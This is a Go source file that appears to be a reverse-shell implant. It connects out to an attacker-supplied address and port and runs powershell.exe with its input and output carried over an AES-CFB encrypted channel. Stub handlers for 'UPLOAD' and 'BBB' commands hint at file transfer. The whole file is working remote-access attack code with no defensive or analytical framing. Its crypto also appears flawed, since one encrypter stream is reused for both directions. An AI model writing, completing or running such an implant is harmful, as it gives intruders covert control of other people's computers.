package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
)

var (
	addr *string
	port *string
	psk  *string
)

func init() {
	addr = flag.String("address", "", "Server address (required)")
	port = flag.String("port", "", "Server port (required)")
	psk = flag.String("psk", "", "Pre-shared key (required)")
	flag.Parse()
}

// showUsageAndExit prints the usage of the program and exits.
func showUsageAndExit() {
	fmt.Println("Usage of", os.Args[0]+":")
	flag.PrintDefaults()
	os.Exit(1)
}

// checkErrors handles error checks and panics if an error occurs.
func checkErrors(err error, msg string) {
	if err != nil {
		panic(msg + ": " + err.Error())
	}
}

// setupEncryptedConnection sets up an encrypted connection using AES.
func setupEncryptedConnection() (net.Conn, cipher.Stream) {
	conn, err := net.Dial("tcp", *addr+":"+*port)
	checkErrors(err, "Failed to dial server")

	decodedPSK, err := hex.DecodeString(*psk)
	checkErrors(err, "Failed to decode PSK")

	block, err := aes.NewCipher(decodedPSK)
	checkErrors(err, "Failed to create AES cipher")

	iv := make([]byte, aes.BlockSize)
	_, err = io.ReadFull(rand.Reader, iv)
	checkErrors(err, "Failed to generate IV")

	conn.Write(iv)

	stream := cipher.NewCFBEncrypter(block, iv)
	return conn, stream
}

// runPowerShell starts the PowerShell process with encrypted input/output.
func runPowerShell(conn net.Conn, stream cipher.Stream) {
	cmd := exec.Command("powershell.exe")
	cmd.Stdin = InterceptInput(conn, stream)
	cmd.Stdout = cipher.StreamWriter{S: stream, W: conn}
	cmd.Stderr = cmd.Stdout

	err := cmd.Run()
	if err != nil {
		fmt.Println("Error executing command:", err)
	}
}

func main() {
	if *addr == "" || *port == "" || *psk == "" {
		showUsageAndExit()
	}

	conn, stream := setupEncryptedConnection()
	defer conn.Close()

	runPowerShell(conn, stream)
}

// InterceptInput returns a reader that processes and filters input commands.
func InterceptInput(conn net.Conn, stream cipher.Stream) io.Reader {
	pr, pw := io.Pipe()

	go func() {
		reader := bufio.NewReader(&cipher.StreamReader{S: stream, R: conn})
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}

			line = strings.TrimSpace(line)
			switch line {
			case "UPLOAD":
				// TODO: handle the "UPLOAD" command
				continue
			case "BBB":
				// TODO: handle the "BBB" command
				continue
			}

			pw.Write([]byte(line + "\n"))
		}
		pw.Close()
	}()

	return pr
}
